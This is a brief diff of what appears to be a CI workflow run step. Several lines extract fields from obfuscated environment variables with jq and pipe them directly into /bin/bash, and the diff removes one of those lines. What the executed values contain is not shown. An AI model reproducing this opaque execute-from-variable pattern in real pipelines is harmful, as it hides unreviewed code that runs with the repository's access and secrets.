@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$tdpik013" | jq -r .mwat5650 | /bin/bash
           echo $rclc3287 | jq -r .sr12 | /bin/bash
-          printf '%s' "$s80306" | jq -r .hhqjf7113 | /bin/bash
           echo $y40 | jq -r .achfe812 | /bin/bash
 
       - name: Upload results
